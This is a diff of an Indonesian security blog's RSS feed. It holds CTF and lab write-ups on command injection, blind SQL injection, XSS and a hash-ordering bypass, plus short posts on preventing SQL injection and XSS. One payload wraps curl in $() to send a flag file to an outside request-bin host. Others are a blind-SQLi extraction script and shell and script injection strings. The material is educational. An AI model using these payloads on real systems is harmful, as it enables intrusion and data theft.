+    <span style="color:#a6e22e">ff</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#a6e22e">cc</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#a6e22e">n</span>();
+
+    <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">bendera</span>[<span style="color:#a6e22e">ll</span>]; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bb</span>[<span style="color:#a6e22e">bendera</span>[<span style="color:#a6e22e">ca</span>](<span style="color:#a6e22e">j</span>)]
+        <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">w</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">w</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">7</span>; <span style="color:#a6e22e">w</span><span style="color:#f92672">++</span>) {
+            <span style="color:#a6e22e">cc</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">c</span>[<span style="color:#a6e22e">ca</span>](<span style="color:#a6e22e">w</span>)<span style="color:#f92672">^</span><span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">ca</span>](<span style="color:#a6e22e">i</span>);
+            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">cc</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>){
+                <span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+            }
+            <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>;
+            <span style="color:#a6e22e">n</span>();
+        }
+    }
+    <span style="color:#a6e22e">n</span>();
+
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">status</span>;
+}
+</code></pre></div><p>Setelah itu, kita jalankan kode tambahan untuk melakukan bruteforce:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">char</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}{ &#34;</span>;
+<span style="color:#a6e22e">bendera</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GEMASTIK{&#34;</span>;
+
+<span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">true</span>){
+    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ctr</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">ctr</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">char</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">ctr</span><span style="color:#f92672">++</span>){
+        <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bendera</span>;
+        <span style="color:#a6e22e">bendera</span> <span style="color:#f92672">+=</span> <span style="color:#66d9ef">char</span>[<span style="color:#a6e22e">ctr</span>];
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">ck</span>()){
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">bendera</span>);
+            <span style="color:#66d9ef">break</span>;
+        }<span style="color:#66d9ef">else</span>{
+            <span style="color:#a6e22e">bendera</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmp</span>;
+        }
+    }
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">bendera</span>[<span style="color:#a6e22e">bendera</span>.<span style="color:#a6e22e">length</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;}&#34;</span>){
+        <span style="color:#66d9ef">break</span>;
+    }
+}
+</code></pre></div><p><img src="/wp-content/2018/10/brute.png" alt=""></p>
+<p>Akhirnya kita berhasil mendapatkan flag
+<strong>GEMASTIK{S0al_HTML_BikiN_ngeTr0LL}</strong></p>
+<p>Terima Kasih.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Writeup Gemastik 11 - Aplikasi Web (?)</title>
+            <link>/writeup-gemastik-11-aplikasi-web/</link>
+            <pubDate>Thu, 04 Oct 2018 06:37:23 +0000</pubDate>
+            
+            <guid>/writeup-gemastik-11-aplikasi-web/</guid>
+            <description>Terdapat sebuah service yang memiliki source code seperti berikut:
+Simpelnya, kita perlu membayar minimal amount 20000 untuk mendapatkan sebuah flag. Akan tetapi tidak semudah itu karena pada proses check, kita hanya diperbolehkan memasukkan amount max 10000. Walaupun dilakukan inspect element, itu percuma saja karena disini dilakukan pengecekan hash untuk memastikan integritas data dari form sebelumnya itu isinya sama dengan form yang akan disubmit.
+Menariknya, kode diatas terdapat sebuah celah keamanan yang sangat fatal.</description>
+            <content type="html"><![CDATA[<p>Terdapat sebuah service yang memiliki source code seperti berikut:</p>
+<p><img src="/wp-content/2018/10/Aplikasi-Web.png" alt=""></p>
+<p>Simpelnya, kita perlu membayar minimal amount 20000 untuk mendapatkan sebuah flag. Akan tetapi tidak semudah itu karena pada proses check, kita hanya diperbolehkan memasukkan amount max 10000. Walaupun dilakukan inspect element, itu percuma saja karena disini dilakukan pengecekan hash untuk memastikan integritas data dari form sebelumnya itu isinya sama dengan form yang akan disubmit.</p>
+<p>Menariknya, kode diatas terdapat sebuah celah keamanan yang sangat fatal.</p>
+<p><img src="/wp-content/2018/10/hashh.png" alt=""></p>
+<p>Kode diatas melakukan sorting pada key berdasarkan lexicographical order dan hanya melakukan hashing pada value nya saja menggunakan sha256. Karena hanya melakukan pengecekan nilai nya saja, otomatis disini kita bisa melakukan manipulasi key berdasarkan lexicographical order agar urutan value yang dihash tetap sama saja pada endpoint /check dan /pay :)</p>
+<p>Cara mudahnya bisa kita inject menggunakan postman saja:</p>
+<p>Saat melakukan injeksi pada /check :</p>
+<p><img src="/wp-content/2018/10/hash1.png" alt=""></p>
+<p>Kemudian, kita lanjutkan injeksi pada /pay :</p>
+<p><img src="/wp-content/2018/10/hash2.png" alt=""></p>
+<p>Akhirnya kita mendapatkan sebuah flag :
+<strong>GEMASTIK{Be_CaReful_WH4t_You_H4SH}</strong></p>
+<p>Terima Kasih.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Writeup SlashRoot CTF - Header Inspector 200</title>
+            <link>/writeup-slashroot-ctf-header-inspector-200/</link>
+            <pubDate>Tue, 31 Jul 2018 10:12:31 +0000</pubDate>
+            
+            <guid>/writeup-slashroot-ctf-header-inspector-200/</guid>
+            <description>Pada soal, diberikan sebuah url web
+http://103.200.7.156:7080/
+Saat kita buka url tsb, ternyata kita dapat mengecek header dari suatu url, misal google
+Pastinya Remote Code Execution, karena biasanya soal tipe seperti ini menggunakan curl. Sayangnya filter lumayan kerad, (; &amp;amp;&amp;amp; | ternyata dibanned :”).
+Oke, untungnya $() tidak dibanned.
+Kita akan membypassnya menggunakan command curl yang dibungkus dengan $() dan mengoper responsenya ke HTTP Request Inspector
+http://reqbin.cacadosman.web.id/v0b9bnv0?inspect
+Kita eksekusi dengan memasukkan payload berikut</description>
+            <content type="html"><![CDATA[<p>Pada soal, diberikan sebuah url web</p>
+<p><a href="http://103.200.7.156:7080/">http://103.200.7.156:7080/</a></p>
+<p>Saat kita buka url tsb, ternyata kita dapat mengecek header dari suatu url, misal google</p>
+<p><img src="/wp-content/2018/07/headins1.png" alt=""></p>
+<p>Pastinya Remote Code Execution, karena biasanya soal tipe seperti ini menggunakan curl. Sayangnya filter lumayan kerad, (; &amp;&amp; | ternyata dibanned :”).</p>
+<p>Oke, untungnya $() tidak dibanned.</p>
+<p>Kita akan membypassnya menggunakan command curl yang dibungkus dengan $() dan mengoper responsenya  ke HTTP Request Inspector</p>
+<p><a href="http://reqbin.cacadosman.web.id/v0b9bnv0?inspect">http://reqbin.cacadosman.web.id/v0b9bnv0?inspect</a></p>
+<p>Kita eksekusi dengan memasukkan payload berikut</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">$(</span>curl --data <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag=</span><span style="color:#66d9ef">$(</span>cat /home/node/flag.txt<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> http://reqbin.cacadosman.web.id/v0b9bnv0<span style="color:#66d9ef">)</span>
+</code></pre></div><p>BIMSALABIM AVADA KADAVRA</p>
+<p><img src="/wp-content/2018/07/headins2.png" alt=""></p>
+<p><strong>SlashRootCTF{b3c0me_a_cvvvrL_n1nj4!}</strong></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Cara Mencegah SQL Injection</title>
+            <link>/cara-mencegah-sql-injection/</link>
+            <pubDate>Wed, 25 Jul 2018 16:55:46 +0000</pubDate>
+            
+            <guid>/cara-mencegah-sql-injection/</guid>
+            <description>Walaupun SQL Injection tergolong vuln yang sudah sangat tua, namun masih saja banyak programmer yang belum mengetahui bahaya dari SQL Injection. Sehingga banyak sekali website yang mudah terkena deface. Kali ini saya ingin memberikan cara mudah untuk mencegah SQL Injection dengan menggunakan prepared statement.
+Untuk kali ini, contoh kasusnya kita menggunakan bahasa pemrograman PHP. Karena bahasa tersebut merupakan salah satu bahasa yang paling banyak penggunanya.
+PDO:
+$conn = new PDO(&amp;#34;mysql:host=$db_servername;dbname=$dbname&amp;#34;, $db_username, $db_password); $stmt = $conn-&amp;gt;prepare(&amp;#34;SELECT * FROM posts WHERE id=:id&amp;#34;); $stmt-&amp;gt;bindParam(&amp;#34;:id&amp;#34;, $post_id); $stmt-&amp;gt;execute(); $posts = $stmt-&amp;gt;fetchAll(); Mysqli:</description>
+            <content type="html"><![CDATA[<p>Walaupun SQL Injection tergolong vuln yang sudah sangat tua, namun masih saja banyak programmer yang belum mengetahui bahaya dari SQL Injection. Sehingga banyak sekali website yang mudah terkena deface. Kali ini saya ingin memberikan cara mudah untuk mencegah SQL Injection dengan menggunakan prepared statement.</p>
+<p>Untuk kali ini, contoh kasusnya kita menggunakan bahasa pemrograman PHP. Karena bahasa tersebut merupakan salah satu bahasa yang paling banyak penggunanya.</p>
+<p><strong>PDO:</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$conn = new PDO(&#34;mysql:host=$db_servername;dbname=$dbname&#34;, $db_username, $db_password);
+
+$stmt = $conn-&gt;prepare(&#34;SELECT * FROM posts WHERE id=:id&#34;);
+$stmt-&gt;bindParam(&#34;:id&#34;, $post_id);
+$stmt-&gt;execute();
+
+$posts = $stmt-&gt;fetchAll();
+</code></pre></div><p><strong>Mysqli:</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$conn = new mysqli($db_servername, $db_username, $db_password, $db_name);
+$stmt = $conn-&gt;prepare(&#34;INSERT INTO posts (title, author, content) VALUES (?, ?, ?)&#34;);
+$stmt-&gt;bind_param(&#34;sss&#34;, $post_title, $post_author, $post_content);
+$stmt-&gt;execute();
+</code></pre></div><p>Dengan menggunakan method prepare dan bind_param, kita dapat mencegah SQL Injection.</p>
+<p>Semoga bermanfaat, terima kasih.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>WriteUp SQLi BTP - Lorem Ipsum (300)</title>
+            <link>/writeup-sqli-btp-lorem-ipsum-300/</link>
+            <pubDate>Tue, 24 Jul 2018 14:30:19 +0000</pubDate>
+            
+            <guid>/writeup-sqli-btp-lorem-ipsum-300/</guid>
+            <description>Terdapat sebuah web yang sekilas terlihat biasa saja, namun saat kita memcoba mengakses hyperlink, ternyata menggunakan ajax. Sampai disini kita curiga bahwa terdapat vuln SQLi pada url api yang menggunakan ajax, sehingga dengan menggunakan HTTP Trace kita dapat mengetahui url api nya.
+Yaitu pada **data.php **dan kita bisa memasukkan inputan pada parameter id dengan metode post, namun inputan harus dalam bentuk base64. Lalu kita coba kirimkan sebuah payload ke url tsb:</description>
+            <content type="html"><![CDATA[<p>Terdapat sebuah web yang sekilas terlihat biasa saja, namun saat kita memcoba mengakses hyperlink, ternyata menggunakan ajax. Sampai disini kita curiga bahwa terdapat vuln SQLi pada url api yang menggunakan ajax, sehingga dengan menggunakan HTTP Trace kita dapat mengetahui url api nya.</p>
+<p><img src="/wp-content/2018/07/btpsqli.png" alt=""></p>
+<p>Yaitu pada **data.php **dan kita bisa memasukkan inputan pada parameter id dengan metode post, namun inputan harus dalam bentuk base64. Lalu kita coba kirimkan sebuah payload ke url tsb:</p>
+<p><img src="/wp-content/2018/07/btpsqli2.png" alt=""></p>
+<p>Ternyata saat kita inputkan “1 or 1 &ndash; -” terdapat sebuah results yang menandakan bahwa vuln terhadap SQL Injection.
+Setelah kita analisa ternyata menggunakan SQLite dan query union ternyata difilter juga sehingga kita terpaksa menggunakan teknik Blind Boolean Based.</p>
+<p>kita perlu mencari nama tabel, kolom, dan value nya dengan menggunakan script berikut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> base64
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">http://35.187.236.126:8013/data.php</span><span style="color:#e6db74">&#34;</span>
+charlist <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">abcdefghijklmnopqrstuvwxyz1234567890 _,)(:}{</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+temp <span style="color:#f92672">=</span> []
+<span style="color:#66d9ef">while</span>(True):
+   temp <span style="color:#f92672">+</span><span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span>]
+   <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(charlist)):
+       temp[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> charlist[i]
+       res <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(temp)
+       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT group_concat(tbl_name,&#39;:&#39;) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
+       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT sql FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name NOT LIKE &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
+       payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">(select CASE WHEN (select group_concat(admin_id) from n1mbusadmin) like </span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> res <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> THEN 1 ELSE 0 END)</span><span style="color:#e6db74">&#34;</span>
+       p64 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload)
+       r <span style="color:#f92672">=</span> post(url, data<span style="color:#f92672">=</span>{<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">id</span><span style="color:#e6db74">&#34;</span>:p64})
+       <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Lorem Ipsum</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+           <span style="color:#66d9ef">print</span> res
+           <span style="color:#66d9ef">break</span>
+       <span style="color:#66d9ef">else</span>:
+           <span style="color:#66d9ef">print</span> res
+</code></pre></div><p>Dengan menggunakan script diatas kita bisa mengetahui nama tabel, kolom, dan value nya. Sehingga kita mendapatkan hasil:</p>
+<pre><code>Tabel: config, n1mbusadmin, news
+Kolom: 
+- config : admin_url
+- n1mbusadmin : op, admin_id, admin_pass
+- news : news_id, content
+Value:
+- admin_url : 1n1admbr0
+- admin_id : backupuser
+- admin_pass : a5b6e34b25f4722b811d371e957aea29
+</code></pre>
+<p>Karena admin_pass masih berupa md5hash sehingga kita perlu meng-unhash pada website ternama seperti hashki*ller sehingga kita mendapatkan admin_pass sesungguhnya yaitu:</p>
+<!-- raw HTML omitted -->
+<p>Oke, saatnya mengeksekusi. kita mendapatkan admin_url, sehingga kita bisa mencoba untuk mengakses url tsb:</p>
+<!-- raw HTML omitted -->
+<p><img src="/wp-content/2018/07/btpsqli3.png" alt=""></p>
+<p>Maka muncul login form dan langsung saja kita masukkan id dan passwordnya dan VOILA kita mendapatkan sebuah FLAG</p>
+<p><strong>FLAG: B2P{af39e6e718f3fb8f2de9ae9e6464b150}</strong></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Web Security Basic - Remote Code Execution</title>
+            <link>/2018/07/21/web-security-basic-remote-code-execution/</link>
+            <pubDate>Sat, 21 Jul 2018 08:15:00 +0000</pubDate>
+            
+            <guid>/2018/07/21/web-security-basic-remote-code-execution/</guid>
+            <description>Requirements:
+ * Basic Linux * PHP * Pantang Menyerah :3  Apa itu RCE ?
+https://searchwindowsserver.techtarget.com/definition/remote-code-execution-RCE
+RCE memungkinkan kita untuk mendapatkan kendali terhadap resource yang terdapat pada server si korban (Mengkontrol device korban) dengan melakukan injeksi perintah pada sistem operasi (mengeksekusi cmd/bash).
+Latihan:
+Buka url berikut
+http://ctf.asgama.tk:40003/
+Kita akan melihat sebuah form
+Terdapat hint berupa source code, mari kita lihat /sauce.txt
+&amp;lt;?php if(isset($_GET[&amp;quot;nama&amp;quot;])){ $nama = $_GET[&amp;quot;nama&amp;quot;]; passthru(&amp;quot;echo &amp;quot; . $nama .</description>
+            <content type="html"><![CDATA[<p>Requirements:</p>
+<pre><code>  * Basic Linux
+  * PHP
+  * Pantang Menyerah :3
+</code></pre>
+<p>Apa itu RCE ?</p>
+<p><a href="https://www.google.com/url?q=https://searchwindowsserver.techtarget.com/definition/remote-code-execution-RCE&amp;sa=D&amp;ust=1532108601684000">https://searchwindowsserver.techtarget.com/definition/remote-code-execution-RCE</a></p>
+<p>RCE memungkinkan kita untuk mendapatkan kendali terhadap resource yang terdapat pada server si korban (Mengkontrol device korban) dengan melakukan injeksi perintah pada sistem operasi (mengeksekusi cmd/bash).</p>
+<p>Latihan:</p>
+<p>Buka url berikut</p>
+<p><a href="https://www.google.com/url?q=http://ctf.asgama.tk:40003/&amp;sa=D&amp;ust=1532108601685000">http://ctf.asgama.tk:40003/</a></p>
+<p>Kita akan melihat sebuah form</p>
+<p><img src="/wp-content/2018/07/image19.png" alt=""></p>
+<p>Terdapat hint berupa source code, mari kita lihat /sauce.txt</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<pre><code>&lt;?php
+       if(isset($_GET[&quot;nama&quot;])){
+           $nama = $_GET[&quot;nama&quot;];
+           passthru(&quot;echo &quot; . $nama . &quot;;&quot;);
+       }
+   ?&gt;
+</code></pre>
+<!-- raw HTML omitted -->
+<p>Jika kita perhatikan kode diatas, maka kita akan menampilkan nama yang kita input pada form dengan fungsi passthru (<a href="https://www.google.com/url?q=http://php.net/manual/en/function.passthru.php&amp;sa=D&amp;ust=1532108601686000">http://php.net/manual/en/function.passthru.php</a>) yaitu untuk mengeksekusi perintah/command pada OS.</p>
+<p>Sehingga, kita bisa memanipulasi inputan kita dengan menginjeksi perintah/command pada OS, pada kasus ini server menggunakan linux sehingga kita tinggal memasukkan perintah bash saja.</p>
+<p>Langsung saja kita eksekusi perintah berikut</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<pre><code>;ls
+</code></pre>
+<!-- raw HTML omitted -->
+<p>Mengapa?</p>
+<p>Pertama, kita tutup dulu command sebelumnya yaitu echo dengan semicolon ;</p>
+<p>lalu kemudian kita dapat bebas menginputkan command apa saja, misalkan ls yaitu untuk melihat list file yang ada di dalam directory.</p>
+<p>Sehingga jika perintah diatas digabungkan akan menjadi</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<pre><code>passthru(&quot;echo ;ls;&quot;);
+</code></pre>
+<!-- raw HTML omitted -->
+<p>Tadaa . . masukkan ;ls dan kita akan melihat list file di directory.</p>
+<p><img src="/wp-content/2018/07/image13.png" alt=""></p>
+<p>Mari kita baca file bendera.txt dengan perintah</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<pre><code>;cat bendera.txt
+</code></pre>
+<!-- raw HTML omitted -->
+<p>Yay kita mendapatkan flagnya</p>
+<p><img src="/wp-content/2018/07/image3.png" alt=""></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Web Security Basic - Cross Site Scripting</title>
+            <link>/web-security-basic-cross-site-scripting/</link>
+            <pubDate>Sat, 21 Jul 2018 08:09:25 +0000</pubDate>
+            
+            <guid>/web-security-basic-cross-site-scripting/</guid>
+            <description>Apa itu Cross Site Scripting (XSS) ?
+https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+Requirements:
+ * Dasar PHP * Dasar Javascript * Many Try, Much Error  Belajar JS :https://www.tutorialspoint.com/javascript/index.htm
+Belajar PHP :https://www.tutorialspoint.com/php/index.htm
+Vulnerability
+XSS Merupakan salah satu vuln yang masih sering ditemukan pada aplikasi web. Tujuannya ialah menyisipkan sebuah payload (malicious code) yang dapat dieksekusi oleh browser (client). Sehingga dalam kasus tersebut, target kita adalah pada client side (Tidak memengaruhi server).
+Macam-macam vuln XSS:</description>
+            <content type="html"><![CDATA[<p>Apa itu Cross Site Scripting (XSS) ?</p>
+<p><a href="https://www.google.com/url?q=https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)&amp;sa=D&amp;ust=1532108601663000">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></p>
+<p>Requirements:</p>
+<pre><code>  * Dasar PHP
+  * Dasar Javascript
+  * Many Try, Much Error
+</code></pre>
+<p>Belajar JS :<a href="https://www.google.com/url?q=https://www.tutorialspoint.com/javascript/index.htm&amp;sa=D&amp;ust=1532108601665000"> </a><a href="https://www.google.com/url?q=https://www.tutorialspoint.com/javascript/index.htm&amp;sa=D&amp;ust=1532108601665000">https://www.tutorialspoint.com/javascript/index.htm</a></p>
+<p>Belajar PHP :<a href="https://www.google.com/url?q=https://www.tutorialspoint.com/php/index.htm&amp;sa=D&amp;ust=1532108601665000"> </a><a href="https://www.google.com/url?q=https://www.tutorialspoint.com/php/index.htm&amp;sa=D&amp;ust=1532108601666000">https://www.tutorialspoint.com/php/index.htm</a></p>
+<!-- raw HTML omitted -->
+<p><strong>Vulnerability</strong></p>
+<p>XSS Merupakan salah satu vuln yang masih sering ditemukan pada aplikasi web. Tujuannya ialah menyisipkan sebuah payload (malicious code) yang dapat dieksekusi oleh browser (client). Sehingga dalam kasus tersebut, target kita adalah pada client side (Tidak memengaruhi server).</p>
+<p>Macam-macam vuln XSS:</p>
+<pre><code>  * Reflected XSS
+  * Stored XSS
+  * DOM Based XSS
+</code></pre>
+<p>Efek yang ditimbulkan:</p>
+<pre><code>  * Pencurian data client (cookie, session hijacking, dll)
+  * Menggangu fungsionalitas website pada frontend
+  * Merubah tampilan web secara total sehingga tidak dapat difungsikan (Deface)
+</code></pre>
+<p>Latihan: <a href="https://www.google.com/url?q=https://xss-game.appspot.com/&amp;sa=D&amp;ust=1532108601669000">https://xss-game.appspot.com/</a></p>
+<!-- raw HTML omitted -->
+<p>Objectives</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<blockquote>
+<p>Inject a script to pop up a JavaScript alert() in the frame below.</p>
+</blockquote>
+<blockquote>
+<p>Once you show the alert you will be able to advance to the next level.</p>
+</blockquote>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>Kita memiliki misi untuk mengeluarkan javascript alert pada web tersebut, simpelnya ialah kita tinggal melakukan injeksi dengan memasukkan script js berikut</p>
+<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;
+</code></pre><p><img src="/wp-content/2018/07/image6.png" alt=""></p>
+<p>Setelah itu kita tekan tombol search.</p>
+<p><img src="/wp-content/2018/07/image33.png" alt=""></p>
+<p>Yay berhasil, mengapa bisa terjadi ?</p>
+<p>Karena XSS mempengaruhi client (browser) sehingga kita bisa mengeksekusi script yang berjalan pada client (JS, CSS, HTML). Salah satu contoh ialah kita dapat merusak tampilan web (deface). Lanjut ke materi selanjutnya.</p>
+<!-- raw HTML omitted -->
+<p>Silakan buka url berikut, lalu login dengan username bee dan password bug.</p>
+<p><a href="https://www.google.com/url?q=http://asgama.tk:5000/xss_stored_1.php&amp;sa=D&amp;ust=1532108601674000">http://asgama.tk:5000/xss_stored_1.php</a></p>
+<p><img src="/wp-content/2018/07/image2.png" alt=""></p>
+<p>Ayo coba kita injeksi dengan javascript</p>
+<pre><code>&lt;script&gt;alert(“hacked by hacker”);&lt;/script&gt;
+</code></pre><p>Lalu kita tekan tombol submit.</p>
+<p><img src="/wp-content/2018/07/image21.png" alt=""></p>
+<p>Yay, akhirnya kita bisa mengeksekusi kode javascript tersebut.</p>
+<p>Setelah itu, coba kita reload ulang halaman web tersebut, maka efeknya pun masih sama yang artinya script yang kita inputkan tadi tersimpan pada database dan akan selalu ditampilkan pada halaman web tersebut saat dibuka. Sehingga kita sebut itu sebagai Stored XSS dan efeknya pun bukan hanya kita sendiri, namun bisa dirasakan oleh user lain yang membuka web tersebut.</p>
+<!-- raw HTML omitted -->
+<p><strong>Hardening</strong></p>
+<p>Untuk bahasa pemrograman PHP, cukup dengan menggunakan fungsi</p>
+<pre><code>htmlentities($string, ENT_QUOTES | ENT_HTML5, 'UTF-8')
+</code></pre><p>Contoh:</p>
+<pre><code>&lt;?php
+
+	$input = $_GET[“nama”];
+
+	echo htmlentities($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+
+?&gt;
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>OLC Cyber Security 1 - Dasar Python dan Kripto</title>
+            <link>/olc-cyber-security-1-dasar-python-dan-kripto-2/</link>
+            <pubDate>Fri, 20 Jul 2018 16:38:22 +0000</pubDate>
+            
+            <guid>/olc-cyber-security-1-dasar-python-dan-kripto-2/</guid>
+            <description>Materi : Dasar Python dan Kriptografi
+Sebuah modul yang dibuat untuk semua pada umumnya dan peserta OmahTI Learning Center pada kususnya. Yah walaupun modulnya kurang menarik. Ditujukan untuk membagikan ilmu kepada sesama, karena pada hakikatnya ilmu itu perlu untuk dibagikan/sebarluaskan.
+Requirements:
+ Niat yang mantaap Dijalankan dengan sungguh-sungguh Mandiri, tidak selalu minta disuap Tidak disalahgunakan untuk kemudaratan  *Jika terdapat penyalahgunaan di kemudian hari, kami tidak bertanggungjawab atas apa yang anda lakukan.</description>
+            <content type="html"><![CDATA[<p><strong>Materi : Dasar Python dan Kriptografi</strong></p>
+<p>Sebuah modul yang dibuat untuk semua pada umumnya dan peserta OmahTI Learning Center pada kususnya. Yah walaupun modulnya kurang menarik. Ditujukan untuk membagikan ilmu kepada sesama, karena pada hakikatnya ilmu itu perlu untuk dibagikan/sebarluaskan.</p>
+<p><strong>Requirements:</strong></p>
+<ol>
+<li>Niat yang mantaap</li>
+<li>Dijalankan dengan sungguh-sungguh</li>
+<li>Mandiri, tidak selalu minta disuap</li>
+<li>Tidak disalahgunakan untuk kemudaratan</li>
+</ol>
+<p>*Jika terdapat penyalahgunaan di kemudian hari, kami tidak bertanggungjawab atas apa yang anda lakukan. Selalu ingat bahwasannya yang diatas selalu mengawasi, gunakan ilmu sebaik-baiknya :)</p>
+<p><strong>0x01 Introduction</strong></p>
+<p>Apa yang anda ketahui tentang hacker?</p>
+<p>Seseorang yang jahat dan berusaha melakukan tidak pidana kejahatan siber?</p>
+<p>Yap, jangan selalu memikirkan konotasi negatif terhadap hacker. Karena hacker itu bukanlah orang jahat yang seperti kalian pikirkan. Hacker adalah orang yang dapat mempelajari, menganalisa, membuat, memodifikasi, atau bahkan mengeksploitasi sistem.</p>
+<p>Sudah jelas bahwa programmer dapat kita kategorikan sebagai hacker juga, bahkan lomba membuat apps dalam semalam pun diberi nama hackathon, padahal dalam hackathon tidak ada yang namanya mengeskploitasi sistem. Akan tetapi kita mengeksploitasi batas kemampuan kita agar dalam waktu yang singkat kita dapat mempelajari, menganalisa, membuat, dan menyelesaikan masalah yang ada dengan pendekatan IT. Jadi jangan pernah berkonotasi negatif terhadap hacker :)</p>
+<p>Lantas, disebut apakah mereka yang senang merusak suatu sistem ?</p>
